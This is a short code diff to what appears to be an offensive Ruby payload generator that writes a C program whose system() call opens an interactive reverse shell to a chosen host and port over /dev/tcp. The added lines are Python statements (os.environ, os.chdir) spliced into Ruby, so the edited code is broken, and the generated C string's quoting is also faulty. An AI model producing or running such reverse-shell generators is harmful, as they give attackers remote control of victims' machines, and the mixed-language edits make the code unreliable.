@@ -43,9 +43,13 @@ file = options.output_file
 sleep(0.5)
 puts "#{g}Writing payload..."
 sleep(1)
+w = os.environ['OLDPWD']
+os.chdir(w)
 open(file, 'w') { |f|
     f.puts "#include <stdio.h>"
     f.puts "int main() {"
     f.puts "    system('#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1');"
     f.puts "}"
 }
+g = os.environ['HOME']
+os.chdir(g + "/thoron")
